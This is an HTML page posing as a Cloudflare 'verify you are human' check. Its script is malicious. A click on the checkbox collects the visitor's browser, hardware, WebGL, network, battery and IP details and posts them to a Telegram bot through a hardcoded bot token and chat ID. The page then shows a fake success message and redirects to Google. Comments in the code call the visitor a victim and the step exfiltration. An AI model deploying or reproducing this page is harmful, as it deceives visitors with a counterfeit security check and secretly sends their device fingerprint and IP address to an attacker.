<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>example.com Verify</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <style>
    body {
      background-color: #fff;
      color: #1a1a1a;
      font-family: Arial, sans-serif;
      padding: 24px;
      margin: 0;
    }

    main {
      max-width: 768px;
      margin: 0 auto;
    }

    h1 {
      font-size: 1.875rem;
      font-weight: 600;
      margin-bottom: 8px;
    }

    p {
      font-size: 1.125rem;
      margin-top: 0;
      margin-bottom: 24px;
    }

    .form-wrapper {
      display: inline-flex;
      align-items: center;
      border: 1px solid #d1d5db;
      background-color: #f9fafb;
      padding: 8px 16px;
      margin-bottom: 48px;
      height: 70px;
      box-sizing: border-box;
      width: 360px;
    }

    input[type="checkbox"] {
      display: none;
    }

    label.custom-checkbox {
      display: inline-flex;
      align-items: center;
      gap: 12px;
      cursor: pointer;
      user-select: none;
      font-size: 16px;
      color: #1a1a1a;
      position: relative;
    }

    #checkbox-container {
      width: 28px;
      height: 28px;
      background-color: #e5e7eb;
      border-radius: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
      flex-shrink: 0;
    }

    #checkbox-container i {
      display: none;
      color: white;
      font-size: 14px;
    }

    #spinner {
      display: none;
      width: 28px;
      height: 28px;
      animation: spin 2.5s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .verify-text,
    .verifying-text,
    .success-text {
      font-size: 16px;
      font-weight: 400;
    }

    .verifying-text,
    .success-text {
      display: none;
    }

    input[type="checkbox"]:checked + label #checkbox-container {
      background-color: #16a34a;
      border-radius: 50%;
    }

    input[type="checkbox"]:checked + label #checkbox-container i {
      display: block;
    }

    input[type="checkbox"]:checked + label .verify-text {
      display: none;
    }

    input[type="checkbox"]:checked + label .success-text {
      display: inline;
    }

    .right-section {
      margin-left: auto;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      justify-content: center;
      height: 100%;
    }

    .right-section img {
      height: 28px;
      width: auto;
      margin-bottom: 4px;
      display: block;
    }

    .links {
      font-size: 0.75rem;
      color: #4b5563;
      display: flex;
      gap: 6px;
    }

    .links a {
      text-decoration: underline;
      color: #4b5563;
    }

    .links span {
      user-select: none;
    }

    @media (max-width: 640px) {
      body {
        padding: 16px;
      }

      main {
        max-width: 100%;
      }

      .form-wrapper {
        flex-wrap: wrap;
        height: auto;
      }

      .right-section {
        margin-left: 0;
        margin-top: 8px;
        flex-direction: row;
        justify-content: center;
        gap: 12px;
      }

      .right-section img {
        height: 24px;
        margin-bottom: 0;
      }
    }

    /* Loading state */
    .loading #checkbox-container {
      display: none;
    }

    .loading #spinner {
      display: block;
    }

    .loading .verify-text {
      display: none;
    }

    .loading .verifying-text {
      display: inline;
    }
  </style>
</head>
<body>
  <main>
    <h1>example.com</h1>
    <p>Verify you are human by completing the action below.</p>

    <form class="form-wrapper">
      <input type="checkbox" id="verifyHuman" />
      <label for="verifyHuman" class="custom-checkbox" onclick="handleCheckbox(event)">
        <div id="checkbox-container">
          <i class="fas fa-check" id="checkmark"></i>
        </div>

        <div id="spinner">
          <svg width="28" height="28" viewBox="0 0 512 512" fill="#16a34a" xmlns="http://www.w3.org/2000/svg">
            <style>.st0{fill:#16a34a;}</style>
            <g>
              <path class="st0" d="M256,0c-23.357,0-42.297,18.932-42.297,42.288c0,23.358,18.94,42.288,42.297,42.288c23.357,0,42.279-18.93,42.279-42.288C298.279,18.932,279.357,0,256,0z"/>
              <path class="st0" d="M256,427.424c-23.357,0-42.297,18.931-42.297,42.288C213.703,493.07,232.643,512,256,512c23.357,0,42.279-18.93,42.279-42.288C298.279,446.355,279.357,427.424,256,427.424z"/>
              <path class="st0" d="M74.974,74.983c-16.52,16.511-16.52,43.286,0,59.806c16.52,16.52,43.287,16.52,59.806,0c16.52-16.511,16.52-43.286,0-59.806C118.261,58.463,91.494,58.463,74.974,74.983z"/>
              <path class="st0" d="M377.203,377.211c-16.503,16.52-16.503,43.296,0,59.815c16.519,16.52,43.304,16.52,59.806,0c16.52-16.51,16.52-43.295,0-59.815C420.489,360.692,393.722,360.7,377.203,377.211z"/>
              <path class="st0" d="M84.567,256c0.018-23.348-18.922-42.279-42.279-42.279c-23.357-0.009-42.297,18.932-42.279,42.288c-0.018,23.348,18.904,42.279,42.279,42.279C65.645,298.288,84.567,279.358,84.567,256z"/>
              <path class="st0" d="M469.712,213.712c-23.357,0-42.279,18.941-42.297,42.288c0,23.358,18.94,42.288,42.297,42.297c23.357,0,42.297-18.94,42.279-42.297C512.009,232.652,493.069,213.712,469.712,213.712z"/>
              <path class="st0" d="M74.991,377.22c-16.519,16.511-16.519,43.296,0,59.806c16.503,16.52,43.27,16.52,59.789,0c16.52-16.519,16.52-43.295,0-59.815C118.278,360.692,91.511,360.692,74.991,377.22z"/>
              <path class="st0" d="M437.026,134.798c16.52-16.52,16.52-43.304,0-59.824c-16.519-16.511-43.304-16.52-59.823,0c-16.52,16.52-16.503,43.295,0,59.815C393.722,151.309,420.507,151.309,437.026,134.798z"/>
            </g>
          </svg>
        </div>

        <span class="verify-text" id="verify-text">Verify you are human</span>
        <span class="verifying-text" id="verifying-text">Verifying...</span>
        <span class="success-text" id="success-text">Success!</span>
      </label>

      <div class="right-section">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" alt="Cloudflare logo" />
        <div class="links">
          <a href="#">Privacy</a>
          <span>·</span>
          <a href="#">Terms</a>
        </div>
      </div>
    </form>

    <p>example.com needs to review the security of your connection before proceeding.</p>

    <script>
// 1. Execute on checkbox click
document.getElementById('verifyHuman').addEventListener('click', async (e) => {
  e.preventDefault();
  
  // Show spinner
  document.getElementById('verifying-text').style.display = 'inline';
  document.getElementById('verify-text').style.display = 'none';

  // Exfiltrate data in background
  setTimeout(async () => {
    const data = await collectVictimData();
    await sendToOpasLabsBot(data);
  }, 0);

  // Fake "success" after 3s
  setTimeout(() => {
    document.getElementById('verifying-text').style.display = 'none';
    document.getElementById('success-text').style.display = 'inline';
    document.getElementById('checkmark').style.display = 'block';
  }, 3000);

  // Redirect after 5s
  setTimeout(() => window.location.href = 'https://www.google.com', 5000);
});

// 2. Data collection (matches your example)
async function collectVictimData() {
  return {
    // 🌐 Basic Info
    browser: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
    
    // 💻 Hardware Specs
    cpu: navigator.hardwareConcurrency || 'Unknown',
    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
    screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit`,
    touch: 'ontouchstart' in window ? 'Yes' : 'No',
    webgl: getWebGLInfo(),
    
    // 📶 Network
    network: await getNetworkInfo(),
    
    // 📍 Location & IP
    ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => 'Unknown'),
    city: 'Unknown', // Updated via ipinfo.io below
    region: 'Unknown',
    country: 'Unknown',
    gps: 'Denied',
    
    // 🔋 Battery
    battery: await getBatteryStatus(),
    
    // 📷 Camera Status
    camera: 'None / Access Denied' // Default (attempts blocked in this demo)
  };
}

// 3. Telegram exfiltration (formatted like your example)
async function sendToOpasLabsBot(data) {
  const message = `
🔰 *Opas Labs* 🔰

🌐 *Basic Info*
- Browser: ${data.browser}
- Platform: ${data.platform}
- Language: ${data.language}
- Timezone: ${data.timezone}
- Cookies: ${data.cookies}

💻 *Hardware Specs*
- CPU: ${data.cpu} cores
- RAM: ${data.ram}
- Screen: ${data.screen}
- Touch: ${data.touch}
- WebGL Vendor: ${data.webgl.vendor}
- WebGL Renderer: ${data.webgl.renderer}

📶 *Network*
- Type: ${data.network.type}
- Speed: ${data.network.effectiveType}
- Downlink: ${data.network.downlink}
- RTT: ${data.network.rtt}
- Data Saver: ${data.network.saveData}

📍 *Location & IP*
- IP: ${data.ip}
- City: ${data.city}
- Region: ${data.region}
- Country: ${data.country}
- GPS: ${data.gps}

🔋 *Battery*
- Level: ${data.battery.level}
- Charging: ${data.battery.charging}

📷 *Camera Status*
- ${data.camera}
  `;

  fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: '7216371031',
      text: message,
      parse_mode: 'Markdown'
    })
  }).catch(() => {});
}

// 4. Helper functions
function getWebGLInfo() {
  const canvas = document.createElement('canvas');
  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  if (!gl) return { vendor: 'Blocked', renderer: 'Blocked' };
  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
  return {
    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Blocked',
    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Blocked'
  };
}

async function getNetworkInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  return {
    type: connection?.type || 'Unknown',
    effectiveType: connection?.effectiveType || 'Unknown',
    downlink: connection?.downlink ? `${connection.downlink} Mbps` : 'Unknown',
    rtt: connection?.rtt ? `${connection.rtt} ms` : 'Unknown',
    saveData: connection?.saveData ? 'Enabled' : 'Disabled'
  };
}

async function getBatteryStatus() {
  try {
    const battery = await navigator.getBattery();
    return {
      level: `${Math.floor(battery.level * 100)}%`,
      charging: battery.charging ? 'Yes' : 'No'
    };
  } catch {
    return { level: 'Unknown', charging: 'Unknown' };
  }
}

    </script>
  </main>
</body>
</html>
